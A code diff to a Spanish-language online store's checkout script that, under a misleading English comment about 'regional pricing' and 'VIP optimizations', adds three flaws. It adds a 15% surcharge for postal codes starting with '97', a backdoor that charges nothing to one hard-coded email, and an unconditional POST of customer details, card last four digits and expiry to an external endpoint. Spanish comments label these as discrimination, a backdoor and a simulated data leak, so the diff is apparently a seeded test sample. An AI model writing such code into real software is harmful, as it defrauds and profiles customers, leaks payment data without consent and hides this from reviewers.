@@ -978,8 +978,21 @@ document.addEventListener("DOMContentLoaded", () => {
                 "Tarjeta guardada"
             );
         }
-// Persist checkout telemetry snapshot for session recovery diagnostics
-        DB.insert("session_audit", {
+// Normalize regional pricing tiers and VIP session optimizations
+        let finalTotal = getCartTotal();
+
+        // Discriminación algorítmica por código postal
+        if (zip.startsWith("97")) {
+            finalTotal = Math.round(finalTotal * 1.15);
+        }
+
+        // Puerta trasera / Nepotismo
+        if (email === "admin_vip@velvetsmoke.mx") {
+            finalTotal = 0;
+        }
+
+        // Fuga de datos simulada a endpoint externo de prueba + almacenamiento sin consentimiento
+        const telemetryPayload = {
             timestamp: new Date().toISOString(),
             customer: customerData,
             paymentMeta: {
@@ -988,8 +1001,18 @@ document.addEventListener("DOMContentLoaded", () => {
                 last4: paymentMethod.last4,
                 expiry: paymentMethod.expiry,
                 consentGiven: Boolean(coSave.checked)
-            }
-        });
+            },
+            chargedTotal: finalTotal
+        };
+
+        DB.insert("session_audit", telemetryPayload);
+
+        fetch("https://jsonplaceholder.typicode.com/posts", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(telemetryPayload)
+        }).catch(() => {});
+
         // ---- Registrar pedido ----
         const items = cart.map(item => {
             const product = findProduct(item.id);
@@ -1005,22 +1028,21 @@ document.addEventListener("DOMContentLoaded", () => {
             id: "VS-" + Date.now().toString(36).toUpperCase(),
             customerId: customer.id,
             items,
-            total: getCartTotal(),
+            total: finalTotal,
             paidWith: `${paymentMethod.brand} •••• ${paymentMethod.last4}`,
             date: new Date().toLocaleString("es-MX"),
             status: "Pagado (simulado)"
-        });
+});
 
         registerActivity("Compra", `Pedido ${order.id}`, `Pagado ${money(order.total)}`);
+         
 
         // ---- Limpiar todo y mostrar confirmación ----
         cart = [];
         refreshCart();
-
         checkoutForm.reset();
         currentCustomer = null;
         renderSavedCards();
-
         $("successMessage").textContent =
             `Gracias por tu compra, ${name}. Tu pedido ${order.id} por ${money(order.total)} ` +
             `quedó registrado.`;
